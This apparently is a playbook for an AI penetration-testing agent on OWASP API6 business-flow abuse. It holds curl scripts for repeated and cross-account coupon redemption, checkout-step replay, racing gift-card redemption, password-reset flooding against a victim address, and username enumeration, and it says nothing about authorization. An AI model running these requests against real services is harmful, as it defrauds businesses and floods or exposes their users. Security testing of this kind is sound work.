---
name: api-business-flow-abuse
description: Testing and exploiting automatable business operations including coupons, referrals, OTPs, reservations, purchases, trials, and pricing at unauthorized scale
intent: offensive
---

# API Business Flow Abuse (OWASP API6)

## Purpose
Identify and exploit API operations that create business value/cost and test whether they can be automated, repeated, or abused beyond their intended human workflow limits.

## Preconditions
- A functional API surface with identified state-changing endpoints
- Understanding of what the business does and what operations cost money or resources

## Attack Surface Signals
- Coupon/discount/promo code endpoints
- Referral/affiliate/invite endpoints
- OTP/password-reset/SMS/email sending endpoints
- Account creation, free trial, or signup endpoints
- Purchase/booking/reservation endpoints
- Gift card/voucher redemption
- Export/report generation
- Username/email availability checks
- Voting/rating/review endpoints
- Pricing/quote calculators
- Inventory reservation or hold endpoints

## Methodology

### Step 1: Identify Business-Valuable Operations
Map endpoints that:
- Create or consume monetary value
- Send communications (email/SMS/push)
- Reserve limited resources
- Grant access or privileges
- Generate computational work on the backend

### Step 2: Understand the Intended Human Workflow
For each identified operation:
- What is the intended user flow? (e.g., coupon redeemed once at checkout)
- What limits/invariants should hold? (e.g., one coupon per account, one trial per user)
- What is the cost to the business if abused at scale?

### Step 3: Test Repeatability
```bash
# Coupon: try redeeming the same coupon multiple times
for i in $(seq 1 5); do
  curl -sk -X POST "https://TARGET/api/coupons/redeem" \
    -H "Authorization: Bearer USER_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"code":"WELCOME10"}' | jq -r '.success // .status'
done

# Referral: try claiming the same referral bonus repeatedly
curl -sk -X POST "https://TARGET/api/referrals/claim" \
  -H "Authorization: Bearer USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"referralCode":"ABC123"}'
```

### Step 4: Test Cross-Account Abuse
```bash
# Can account B use a coupon that account A already used?
curl -sk -X POST "https://TARGET/api/coupons/redeem" \
  -H "Authorization: Bearer USER_B_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"code":"WELCOME10"}'
```

### Step 5: Test Automation Resistance
```bash
# OTP/email: send many requests rapidly to test throttling
for i in $(seq 1 20); do
  curl -sk -X POST "https://TARGET/api/auth/forgot-password" \
    -H "Content-Type: application/json" \
    -d '{"email":"victim@example.com"}' &
done
wait

# Username enumeration: bulk availability checks
for user in admin root test support api; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://TARGET/api/users/check?username=$user")
  echo "$user: $code"
done
```

### Step 6: Test Replay / Sequence Skipping
```bash
# Can checkout steps be executed out of order?
# e.g., redeem coupon → confirm → pay → apply coupon again
curl -sk -X POST "https://TARGET/api/checkout/apply-coupon" \
  -H "Authorization: Bearer USER_TOKEN" \
  -H "Content-Type: application/json" -d '{"code":"WELCOME10"}'
curl -sk -X POST "https://TARGET/api/checkout/confirm" \
  -H "Authorization: Bearer USER_TOKEN"
curl -sk -X POST "https://TARGET/api/checkout/apply-coupon" \
  -H "Authorization: Bearer USER_TOKEN" \
  -H "Content-Type: application/json" -d '{"code":"WELCOME10"}'
```

### Step 7: Test Concurrency (where applicable)
```bash
# Parallel gift-card redemption
for i in $(seq 1 10); do
  curl -sk -X POST "https://TARGET/api/giftcards/redeem" \
    -H "Authorization: Bearer USER_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"code":"GIFT123"}' &
done
wait
# Check: did the same card get credited more than once?
```

## Evidence Contract

A business-flow abuse finding requires:
1. The intended business limit/invariant (e.g., one coupon per account)
2. The manipulation that violated it (the actual API calls)
3. Concrete business impact (value credited twice, cost incurred, resources exhausted)
4. Reproducibility (the same sequence reliably produces the same result)

**NOT evidence**: The endpoint exists, a coupon code is accepted, an email is sent (single instance)

## Common Misses
- Rate limiting on the frontend but not the API
- Optimistic locking absent on inventory/booking endpoints
- Server-side validation that only checks the LAST request (race window)
- Workflows that can be skipped by calling later steps directly
- Batch endpoints that apply limits per-batch but not per-item
- Export endpoints that create expensive backend jobs without limits

## False Positives / Non-Findings
- A single operation working as intended (coupon redeemed once)
- Endpoint exists but properly enforces per-account limits
- OTP sending is properly throttled

## Xalgorix Tool Strategy
- `terminal_execute` with bash loops for sequential and parallel testing
- Python for complex multi-step workflows
- `http_request` for precise API interactions

## Stopping Rule
Test every identified business-flow endpoint for repeatability, cross-account abuse, automation resistance, and sequence manipulation.

## Handoff
Report each confirmed abuse with the operation, the violated invariant, the manipulation, and the concrete business impact (money saved, resources consumed, messages sent, etc.).
